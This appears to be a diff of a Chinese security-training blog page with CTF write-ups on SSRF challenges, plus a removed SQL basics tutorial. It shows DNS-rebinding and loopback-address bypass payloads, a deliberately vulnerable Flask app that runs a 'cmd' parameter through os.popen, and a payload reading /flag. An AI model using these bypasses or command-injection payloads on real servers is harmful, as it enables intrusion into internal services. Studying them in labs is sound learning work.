+<p>利用服务器读 url，传 file 伪协议即可.</p>
+<p><img src="/images/W6blbF5fqo8FGoxBo0NcsHb0nOc.png"></p>
+<h2 id="NSSRound-28-Team-ez-ssrf"><a href="#NSSRound-28-Team-ez-ssrf" class="headerlink" title="[NSSRound#28 Team]ez_ssrf"></a>[NSSRound#28 Team]ez_ssrf</h2><p>看题，题目中还提示了”flag 在&#x2F;flag 路由中 “</p>
+<p><img src="/images/EL8fb8YFCoQQvixR4uocST6nnNb.png"></p>
+<p>读了读代码，发现它绕过了 127.0.0.1 和 ipv6 形式::1，试了试各种进制绕过，发现并不好使</p>
+<p><img src="/images/Q9kNbOczPov19NxtkfIcYDm6nhf.png"></p>
+<p>302 重定向绕过需要搭 VPS，暂时还不打算搞，于是尝试了一下 DNS 重绑定绕过，运行是通过的:</p>
+<h3 id="法一-DNS-重绑定绕过"><a href="#法一-DNS-重绑定绕过" class="headerlink" title="法一 DNS 重绑定绕过"></a>法一 DNS 重绑定绕过</h3><p>先复习一下 DNS 重绑定的原理:利用两次解析的短暂间隙</p>
+<p><img src="/images/Ws27bMGXAodFyIxkTulcPtv4nTe.png"></p>
+<p>工具如下:</p>
+<p><a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p>
+<p>我们输入可以正常访问的 192.168.1.1 和需要解析的 127.0.0.1，生成了一个新网址</p>
+<p><img src="/images/DjJob49yrokblGxJDfzcltj7nJe.png"></p>
+<p>复制这个网址尝试 payload:?url&#x3D;<a target="_blank" rel="noopener" href="http://7f000001.c0a80001.rbndr.us/flag">http://7f000001.c0a80001.rbndr.us/flag</a></p>
+<p><img src="/images/FYf6bIOGFoTc7oxtUYqcGS74nZd.png"></p>
+<p>上图可知第一次并没有成功，多刷新几次，运行通过!</p>
+<p><img src="/images/AQSubUzfEoIHLGxvxoZcgRDYn6b.png"></p>
+<h3 id="法二-回环地址的不唯一性"><a href="#法二-回环地址的不唯一性" class="headerlink" title="法二 回环地址的不唯一性"></a>法二 回环地址的不唯一性</h3><p>问了下学过计网的研究生学长（没接触 CTF），他说回环地址不唯一，ip 直接输 0 或者 127.x.y.z，xyz 为合理的任意值都属于回环地址</p>
+<p><img src="/images/JNGjbZhg5oleQLxh9eicItvKnYb.png"></p>
+<p>于是就有了新解</p>
+<p><img src="/images/FBuDbZ9KCobxKUxDwFwcsFeDnwh.png"></p>
+<p><img src="/images/RsT5bSm1uopOeExfoS6c4K0ynmg.png"></p>
+<h2 id="DNS-想要玩"><a href="#DNS-想要玩" class="headerlink" title="DNS 想要玩"></a>DNS 想要玩</h2><p>读题，代码都没换行，咱们先给他换个行</p>
+<p><img src="/images/SrgSbdhCzoi5GexiHSDcPljRned.png"></p>
+<p>换行以后:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask, request</span><br><span class="line"><span class="keyword">from</span> urllib.parse import urlparse</span><br><span class="line">import socket</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line">BlackList=[</span><br><span class="line">    <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;@&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;172&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;gopher&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dict&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tcp&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;114.5.1.4&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">check</span>(url):</span><br><span class="line">    url = <span class="title function_ invoke__">urlparse</span>(url)</span><br><span class="line">    host = url.hostname</span><br><span class="line">    host_acscii = host.<span class="title function_ invoke__">encode</span>(<span class="string">&#x27;idna&#x27;</span>).<span class="title function_ invoke__">decode</span>(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> socket.<span class="title function_ invoke__">gethostbyname</span>(host_acscii) == <span class="string">&#x27;114.5.1.4&#x27;</span></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">open</span>(__file__).<span class="title function_ invoke__">read</span>()</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/ssrf&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">ssrf</span>():</span><br><span class="line">    raw_url = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> not raw_url:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;URL Needed&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> u in BlackList:</span><br><span class="line">        <span class="keyword">if</span> u in raw_url:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invaild URL&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="title function_ invoke__">check</span>(raw_url):</span><br><span class="line">        <span class="keyword">return</span> os.<span class="title function_ invoke__">popen</span>(request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;cmd&#x27;</span>)).<span class="title function_ invoke__">read</span>()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NONONO&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里面有几个 @app.route 意思是访问这个目录就会执行这个函数，如果黑名单查询通过了，就会执行 get 形式提交的 cmd 命令，还用到了 os 模块</p>
+<p>那访问下&#x2F;ssrf 呗?</p>
+<p><img src="/images/MrJUb4N0uo0FTyxb4yWcLdOgn5f.png"></p>
+<p>他说需要一个 url,我们给 127.0.0.1,提示内部错误</p>
+<p><img src="/images/CJjrbPM4logaqzxYNZMcTJOKnzh.png"></p>
+<p>我又读了一下代码，发现 check 这段根本不是在做黑名单检测，而是可能在前端进行重定向(?)，通过黑名单检测后，自动转成 114.5.1.4</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">BlackList=[</span><br><span class="line">    <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;@&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;172&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;gopher&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dict&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;tcp&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;114.5.1.4&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">url</span>):</span><br><span class="line">    url = urlparse(url)</span><br><span class="line">    host = url.hostname</span><br><span class="line">    host_acscii = host.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> socket.gethostbyname(host_acscii) == <span class="string">&#x27;114.5.1.4&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssrf&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssrf</span>():</span><br><span class="line">    raw_url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> raw_url:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;URL Needed&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> u <span class="keyword">in</span> BlackList:</span><br><span class="line">        <span class="keyword">if</span> u <span class="keyword">in</span> raw_url:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invaild URL&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> check(raw_url):</span><br><span class="line">        <span class="keyword">return</span> os.popen(request.args.get(<span class="string">&#x27;cmd&#x27;</span>)).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NONONO&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>打开 DNS 工具，试一下利用重绑定绕过</p>
+<p><img src="/images/Y34FbwkePoYn3zxIMVwcBzLLnsf.png"></p>
+<p>?url&#x3D;<a target="_blank" rel="noopener" href="http://72050104.7f000001.rbndr.us&cmd=cat/">http://72050104.7f000001.rbndr.us&amp;cmd=cat</a> &#x2F;flag 刷新几次运行通过</p>
+<p><img src="/images/AscobXuzeoEN5yxIcknc5vZxnB0.png"></p>
+<h3 id="做题启示"><a href="#做题启示" class="headerlink" title="做题启示"></a>做题启示</h3><p>我一直疑惑这题 url 为啥要用 http 请求，一开始不用死活做不出，投给了 AI 他这么回答:</p>
+<p><img src="/images/AqIKbWUTKoj2EJxQ1wZckPhOnwg.png"></p>
+<p>后面的题目我也不懂什么函数要标准 URL，什么函数不要，那遇到这种情况普遍加个 http 试错吧.</p>
+<h2 id="hello-ssrf-Level1-2"><a href="#hello-ssrf-Level1-2" class="headerlink" title="hello-ssrf-Level1-2"></a>hello-ssrf-Level1-2</h2><p>9.2 节<a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/WkNcw9YZUip39xkY5ufcBrGan2v#share-FhDGd0ZkxodbaOxnDFPcD9sKnlh">[Week9.2]SSRF 漏洞利用</a></p>
+<h2 id="hello-ssrf-Level3"><a href="#hello-ssrf-Level3" class="headerlink" title="hello-ssrf-Level3"></a>hello-ssrf-Level3</h2><p>按要求复制粘贴发 gopher 协议就行了，注意第一个字符不读取，这里就不重新打一遍了</p>
+<h2 id="hello-ssrf-Level4"><a href="#hello-ssrf-Level4" class="headerlink" title="hello-ssrf-Level4"></a>hello-ssrf-Level4</h2><p>靶机似乎有问题，打开和 3 一样</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2026/12/02/%E7%AC%AC%E4%B8%83%E7%AB%A0-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="legend1440">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="拂云观 · legend1440">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2026/12/02/%E7%AC%AC%E4%B8%83%E7%AB%A0-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">第七章-PHP反序列化</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-12-02 12:00:00" itemprop="dateCreated datePublished" datetime="2026-12-02T12:00:00+08:00">2026-12-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-01-21 01:53:17" itemprop="dateModified" datetime="2026-01-21T01:53:17+08:00">2026-01-21</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -2128,821 +2398,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2025/11/11/%E7%AC%AC%E5%9B%9B%E7%AB%A0-SQL%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="legend1440">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="拂云观 · legend1440">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/11/11/%E7%AC%AC%E5%9B%9B%E7%AB%A0-SQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">第四章-SQL注入</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-11-11 12:00:00" itemprop="dateCreated datePublished" datetime="2025-11-11T12:00:00+08:00">2025-11-11</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-01-21 01:41:26" itemprop="dateModified" datetime="2026-01-21T01:41:26+08:00">2026-01-21</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/training/" itemprop="url" rel="index"><span itemprop="name">-training</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>飞书链接:<a target="_blank" rel="noopener" href="https://icnewi51k2yp.feishu.cn/wiki/K0giwmjwUiZksMkV7YbcD7qbnFb?from=from_copylink">https://icnewi51k2yp.feishu.cn/wiki/K0giwmjwUiZksMkV7YbcD7qbnFb?from=from_copylink</a></p>
-<h1 id="Week4-1-数据库基础与-SQL-基本语法"><a href="#Week4-1-数据库基础与-SQL-基本语法" class="headerlink" title="[Week4.1]数据库基础与 SQL 基本语法"></a>[Week4.1]数据库基础与 SQL 基本语法</h1><h2 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h2><p>参考文章 <a target="_blank" rel="noopener" href="https://blog.csdn.net/senxu_/article/details/126877128">https://blog.csdn.net/senxu_&#x2F;article&#x2F;details&#x2F;126877128</a></p>
-<p><strong>数据库管理系统</strong>(Database Management System)是一种操纵和管理数据库的大型软件，用于建立、使用和维护数据库，简称 DBMS。</p>
-<p>它对数据库进行统一的管理和控制，以保证数据库的安全性和完整性。用户通过 DBMS 访问数据库中的数据，数据库管理员也通过 DBMS 进行数据库的维护工作。</p>
-<p>它可以支持多个应用程序和用户用不同的方法在同时或不同时刻去建立，修改和询问数据库。大部分 DBMS 提供<strong>数据定义语言 DDL</strong> 和<strong>数据操作语言 DML</strong>，供用户定义数据库的模式结构与权限约束，实现对数据的追加、删除等操作。</p>
-<p>其又是由<strong>许多程序所组成</strong>的一个大型软件系统，每个程序都有自己的功能，共同完成 DBMS 的一个或几个工作。</p>
-<h3 id="DBMS-的组成程序"><a href="#DBMS-的组成程序" class="headerlink" title="DBMS 的组成程序"></a>DBMS 的组成程序</h3><p><strong>（1）语言编译处理程序</strong></p>
-<p>包含数据定义语言 DDL 编译程序和数据操作语言 DML 编译程序.</p>
-<p><strong>数据定义语言 DDL 编译程序</strong>把用 DDL 编写的各级源模式编译成各级目标模式。这些目标模式是对数据库结构信息的描述，它们被保存在数据字典中，供以后数据操纵或数据控制时使用。</p>
-<p><strong>数据操作语言 DML 编译程序</strong>将应用程序中的 DML 语句转换成可执行程序，实现对数据库的检索、插入、删除和修改等基本操作。</p>
-<p><strong>（2）系统运行控制程序</strong></p>
-<p><strong>（3）系统建立、维护程序</strong></p>
-<p><strong>（4）数据字典</strong></p>
-<h3 id="DBMS-的功能"><a href="#DBMS-的功能" class="headerlink" title="DBMS 的功能"></a>DBMS 的功能</h3><p><strong>（1）数据定义功能</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DBMS提供数据定义语言（Data Define Language，DDL），定义数据的模式、外模式和内模式三级模式结构，定义模式/内模式和外模式/模式二级映像，定义有关的约束条件。例如，为保证数据库安全而定义用户口令和存取权限，为保证正确语义而定义完整性规则等。再如,DBMS提供的结构化查询语言（SQL）提供Create、Drop、Alter等语句可分别用来建立、删除和修改数据库。</span><br><span class="line"></span><br><span class="line">用DDL定义的各种模式需要通过相应的模式翻译程序转换为机器内部代码表示形式，保存在数据字典（Data Dictionary，DD）（或称为系统目录）中。数据字典是DBMS存取数据的基本依据。因此，DBMS中应包括DDL的编译程序。</span><br></pre></td></tr></table></figure>
-
-<p><strong>（2）数据操纵功能</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DBMS提供数据操纵语言（Data Manipulation Language，DML）实现对数据库的基本操作，包括检索、更新（包括插入、修改和删除）等。因此，在DBMS中也应包括DML的编译程序或解释程序。</span><br><span class="line"></span><br><span class="line">DML有两类：一类是自主型的或自含型的，这一类属于交互式命令语言，语法简单可独立使用；另一类是宿主型的，&lt;u&gt;它把对数据库的存取语句嵌入在高级语言&lt;/u&gt;（如Fortran、Pascal、C等）中，不能单独使用。**SQL就是数据操纵语言的一种。**例如,DBMS提供的结构化查询语言SQL提供查询语句（Select）、插入语句（Insert）、修改语句（Update）和删除语句（Delete），可分别实现对数据库中数据记录的查询、插入、修改和删除等操作。</span><br></pre></td></tr></table></figure>
-
-<p><strong>（3）数据库运行管理功能</strong></p>
-<p><strong>（4）数据库的建立和维护功能</strong></p>
-<p><strong>（5）数据组织、存储、管理</strong></p>
-<p><strong>（6）数据通信功能</strong></p>
-<h3 id="DBMS-的特点"><a href="#DBMS-的特点" class="headerlink" title="DBMS 的特点"></a>DBMS 的特点</h3><p><strong>（1）数据结构化且统一管理</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有DBMS统一管理。优点是数据易维护，易扩展，数据冗余明显减少，真正实现了数据的共享。</span><br></pre></td></tr></table></figure>
-
-<p><strong>（2）有较高的数据独立性</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数据库的独立性包括数据的物理独立性和数据的逻辑独立性。</span><br></pre></td></tr></table></figure>
-
-<p><strong>（3）数据库控制功能</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">包括对数据库中数据的安全性、完整性、并发和恢复的控制。</span><br></pre></td></tr></table></figure>
-
-<h2 id="数据库表"><a href="#数据库表" class="headerlink" title="数据库表"></a>数据库表</h2><p>一个数据库表（Table）是关系型数据库（如 MySQL、Oracle、SQL Server 等）中存储数据的<strong>核心结构化对象</strong>，本质是由「行（记录）」和「列（字段）」组成的二维表格，同时包含约束、元数据等辅助信息以保证数据的完整性和规范性。</p>
-<p>假设你要做一个「班级学生登记表」，这个表就是数据库里的 “表”：</p>
-<h3 id="列（字段）-表格的-“表头”"><a href="#列（字段）-表格的-“表头”" class="headerlink" title="列（字段）&#x3D; 表格的 “表头”"></a>列（字段）&#x3D; 表格的 “表头”</h3><p>就像 Excel 里第一行的 “姓名、学号、性别、生日、成绩”，数据库表的 “列” 就是给数据定规矩的：</p>
-<ul>
-<li>每一列有个明确的 “名字”（比如 “学号”“成绩”），不能重复；</li>
-<li>每一列有固定 “格式”（比如 “学号” 只能是数字、“生日” 只能是日期、“成绩” 是 0-100 的数字）；</li>
-<li>还能加 “小规则”（比如 “学号不能重复”“姓名必须填”“成绩不能是负数”）。</li>
-</ul>
-<h3 id="行（记录）-表格里的-“每一行数据”"><a href="#行（记录）-表格里的-“每一行数据”" class="headerlink" title="行（记录）&#x3D; 表格里的 “每一行数据”"></a>行（记录）&#x3D; 表格里的 “每一行数据”</h3><p>Excel 里除了表头，每一行都对应一个学生的信息，数据库表的 “行” 就是具体的 “实体数据”：</p>
-<ul>
-<li>一行对应一个完整的对象（比如 “张三” 这个人的所有信息）；</li>
-<li>每一行的 “学号” 是唯一的（就像身份证），不会有两个学生学号一样；</li>
-<li>行越多，说明存的实体越多（比如班里 50 个学生，就有 50 行）。</li>
-</ul>
-<h3 id="约束-给表格定的-“规矩”"><a href="#约束-给表格定的-“规矩”" class="headerlink" title="约束 &#x3D; 给表格定的 “规矩”"></a>约束 &#x3D; 给表格定的 “规矩”</h3><p>比如你在登记表里要求 “学号不能重复”“必须填姓名”“成绩不能超 100”，这些就是数据库表的 “约束”：</p>
-<ul>
-<li>保证数据不乱（不会出现 “学号重复”“没填姓名”“成绩 150 分” 这种离谱情况）；</li>
-<li>就像生活中 “身份证号唯一”“上班必须打卡” 的规矩，防止出错。</li>
-</ul>
-<h3 id="索引-表格的-“目录”"><a href="#索引-表格的-“目录”" class="headerlink" title="索引 &#x3D; 表格的 “目录”"></a>索引 &#x3D; 表格的 “目录”</h3><p>如果班里有 1000 个学生，想快速找到 “学号 2024001 的学生”，总不能一行行翻吧？数据库的 “索引” 就像书的目录，提前记下 “学号 2024001 在第 3 行”，不用全表找，直接定位，查得更快。</p>
-<h3 id="元数据-表格的-“备注”"><a href="#元数据-表格的-“备注”" class="headerlink" title="元数据 &#x3D; 表格的 “备注”"></a>元数据 &#x3D; 表格的 “备注”</h3><p>就像你在 Excel 表名旁边写 “2024 级 3 班学生表”，或者在表头备注 “成绩满分 100”，数据库的 “元数据” 就是记录这个表的基本信息：</p>
-<ul>
-<li>表叫什么名字、用来存什么（比如 “学生表” 存学生信息）；</li>
-<li>每一列的格式、规矩是什么（比如 “生日是日期格式”）；</li>
-<li>这个表是哪天建的、用了什么格式存储（比如 UTF-8 能存中文）。</li>
-</ul>
-<h3 id="数据的一般要求"><a href="#数据的一般要求" class="headerlink" title="数据的一般要求"></a>数据的一般要求</h3><p><strong>关键信息不能重（实体完整性：UNIQUE&#x2F;PRIMARY KEY）</strong></p>
-<p>就像身份证号、学号不能和别人重复 —— 表中 “唯一标识” 类的列，值必须独一无二，用来区分不同行（不同对象）。</p>
-<ul>
-<li>要求：用 <code>PRIMARY KEY</code>（主键，非空 + 唯一，比如学号、用户 ID）或 <code>UNIQUE</code>（唯一约束，比如手机号、邮箱）；</li>
-<li>例子：学生表的 “学号” 不能重复（一个学号对应一个学生）；订单表的 “订单号” 不能重复（一个订单号对应一个订单）；</li>
-<li>反面教材：两个学生学号都是 “2024001”，查 “学号 2024001 的成绩” 会出来两行，根本分不清是谁的。</li>
-</ul>
-<p><strong>数据格式不能错（域完整性：数据类型 + CHECK）</strong></p>
-<p>就像 “年龄” 只能填数字、“生日” 只能填日期 —— 每列的数据必须符合预设的 “格式规矩”，不能乱填。</p>
-<ul>
-<li>要求：列指定明确数据类型（INT &#x2F; 日期 &#x2F; VARCHAR 等），必要时加 <code>CHECK</code> 约束；</li>
-<li>例子：“年龄” 列是 INT 类型，不能填 “二十”“99.5”“abc”；“成绩” 列加 <code>CHECK (成绩 BETWEEN 0 AND 100)</code>，不能填 150 分；“手机号” 是 CHAR (11)，不能填 10 位或 12 位；</li>
-<li>反面教材：“生日” 列填 “2024-30-50”（日期不存在）、“成绩” 列填 “优秀”（不是数字），数据库没法识别，后续统计、查询全失效。</li>
-</ul>
-<h3 id="数据的选定"><a href="#数据的选定" class="headerlink" title="数据的选定"></a>数据的选定</h3><p><strong>列是 “直接指定”，行是 “靠列的条件间接筛选”</strong></p>
-<p>在下面的函数中,用 column1,2,3 选定列，而行通常用 WHERE 条件选定</p>
-<p>例如:</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> 学生表</span><br><span class="line"><span class="keyword">SET</span> 成绩 <span class="operator">=</span> <span class="number">80</span></span><br><span class="line"><span class="keyword">WHERE</span> 年级 <span class="operator">=</span> <span class="number">2024</span> <span class="keyword">AND</span> 成绩 <span class="operator">&lt;</span> <span class="number">80</span>;  <span class="comment">-- 多条件组合选行</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="SQL-基本语法"><a href="#SQL-基本语法" class="headerlink" title="SQL 基本语法"></a>SQL 基本语法</h2><h3 id="概论"><a href="#概论" class="headerlink" title="概论"></a>概论</h3><p>SQL（Structured Query Language）是一种用于<strong>管理和操作关系数据库</strong>的标准语言，包括数据查询、数据插入、数据更新、数据删除、数据库结构创建和修改等功能。<strong>需要在数据库上执行的大部分工作都由 SQL 语句完成。</strong></p>
-<p><img src="/images/X32VbWpTdopoqBxh8WEcv2k9nmf.png"></p>
-<p>注意:SQL 对大小写不敏感：SELECT 与 select 是相同的。</p>
-<p>某些数据库系统要求在每条 SQL 语句的末端使用<strong>分号</strong>。</p>
-<p><strong>分号</strong>是在数据库系统中分隔每条 SQL 语句的标准方法，这样就可以在对服务器的相同请求中执行一条以上的 SQL 语句。</p>
-<h3 id="数据的处理-查询-修改-插入-和删除"><a href="#数据的处理-查询-修改-插入-和删除" class="headerlink" title="数据的处理(查询 修改(插入)和删除)"></a>数据的处理(查询 修改(插入)和删除)</h3><h4 id="SELECT"><a href="#SELECT" class="headerlink" title="SELECT"></a>SELECT</h4><p>SELECT：用于从数据库中查询数据。</p>
-<p>SELECT column_name(s)</p>
-<p>FROM table_name</p>
-<p>WHERE condition</p>
-<p>ORDER BY column_name [ASC|DESC]</p>
-<ul>
-<li><code>column_name(s)</code>: 要查询的列。</li>
-<li><code>table_name</code>: 要查询的表。</li>
-<li><code>condition</code>: 查询条件（可选）。</li>
-<li><code>ORDER BY</code>: 排序方式，<code>ASC</code> 表示升序，<code>DESC</code> 表示降序（可选）。</li>
-</ul>
